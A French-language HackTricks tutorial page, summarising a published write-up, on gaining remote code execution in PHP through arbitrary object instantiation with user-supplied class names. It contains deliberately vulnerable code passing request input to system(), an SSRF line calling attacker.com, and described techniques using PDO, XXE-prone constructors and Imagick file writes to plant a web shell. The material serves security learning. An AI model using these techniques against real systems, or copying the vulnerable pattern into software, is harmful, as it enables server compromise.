# PHP - RCE en abusant de la cr√©ation d'objet : new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

Ceci est essentiellement un r√©sum√© de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introduction

La cr√©ation de nouveaux objets arbitraires, tels que `new $_GET["a"]($_GET["a"])`, peut conduire √† une ex√©cution de code √† distance (RCE), comme d√©taill√© dans un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ce document met en √©vidence diverses strat√©gies pour atteindre une RCE.

## RCE via des classes personnalis√©es ou un chargement automatique

La syntaxe `new $a($b)` est utilis√©e pour instancier un objet o√π **`$a`** repr√©sente le nom de la classe et **`$b`** est le premier argument pass√© au constructeur. Ces variables peuvent provenir d'entr√©es utilisateur telles que GET/POST, o√π elles peuvent √™tre des cha√Ænes ou des tableaux, ou de JSON, o√π elles peuvent appara√Ætre sous d'autres types.

Consid√©rez l'extrait de code ci-dessous :
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans ce cas, en d√©finissant `$a` sur `App` ou `App2` et `$b` sur une commande syst√®me (par exemple, `uname -a`), cela entra√Æne l'ex√©cution de cette commande.

Les **fonctions d'autoload** peuvent √™tre exploit√©es si de telles classes ne sont pas directement accessibles. Ces fonctions chargent automatiquement les classes √† partir de fichiers lorsque n√©cessaire et sont d√©finies en utilisant `spl_autoload_register` ou `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Le comportement du chargement automatique varie selon les versions de PHP, offrant diff√©rentes possibilit√©s d'ex√©cution de code √† distance.

## RCE via les classes int√©gr√©es

En l'absence de classes personnalis√©es ou d'autoloaders, les **classes PHP int√©gr√©es** peuvent suffire pour l'ex√©cution de code √† distance. Le nombre de ces classes varie entre 100 et 200, en fonction de la version de PHP et des extensions. Elles peuvent √™tre r√©pertori√©es en utilisant `get_declared_classes()`.

Les constructeurs d'int√©r√™t peuvent √™tre identifi√©s gr√¢ce √† l'API de r√©flexion, comme le montre l'exemple suivant et le lien [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**L'ex√©cution de code √† distance via des m√©thodes sp√©cifiques inclut:**

### **SSRF + D√©s√©rialisation Phar**

La classe `SplFileObject` permet SSRF gr√¢ce √† son constructeur, permettant des connexions √† n'importe quelle URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF peut conduire √† des attaques de d√©s√©rialisation dans les versions de PHP ant√©rieures √† 8.0 en utilisant le protocole Phar.

### **Exploitation des PDOs**

Le constructeur de la classe PDO permet des connexions aux bases de donn√©es via des cha√Ænes DSN, permettant potentiellement la cr√©ation de fichiers ou d'autres interactions:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Les versions de PHP jusqu'√† 5.3.22 et 5.4.12 √©taient vuln√©rables aux attaques XXE √† travers les constructeurs `SoapClient` et `SimpleXMLElement`, en fonction de la version de libxml2.

## RCE via l'extension Imagick

Dans l'analyse des **d√©pendances d'un projet**, il a √©t√© d√©couvert que **Imagick** pouvait √™tre utilis√© pour **l'ex√©cution de commandes** en instanciant de nouveaux objets. Cela offre une opportunit√© d'exploiter des vuln√©rabilit√©s.

### Analyseur VID

La capacit√© de l'analyseur VID √† √©crire du contenu dans n'importe quel chemin sp√©cifi√© dans le syst√®me de fichiers a √©t√© identifi√©e. Cela pourrait permettre de placer un shell PHP dans un r√©pertoire accessible via le web, permettant ainsi l'ex√©cution de code √† distance (RCE).

#### Analyseur VID + T√©l√©chargement de fichiers

Il est not√© que PHP stocke temporairement les fichiers t√©l√©charg√©s dans `/tmp/phpXXXXXX`. L'analyseur VID dans Imagick, en utilisant le protocole **msl**, peut g√©rer des jokers dans les chemins de fichiers, facilitant le transfert du fichier temporaire vers un emplacement choisi. Cette m√©thode offre une approche suppl√©mentaire pour r√©aliser l'√©criture de fichiers arbitraires dans le syst√®me de fichiers.

### Plantage PHP + Force brute

Une m√©thode d√©crite dans le [**rapport original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) implique le t√©l√©chargement de fichiers qui provoquent un plantage du serveur avant leur suppression. En effectuant une attaque par force brute sur le nom du fichier temporaire, il devient possible pour Imagick d'ex√©cuter du code PHP arbitraire. Cependant, cette technique s'est av√©r√©e efficace uniquement dans une version obsol√®te d'ImageMagick.

## R√©f√©rences

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
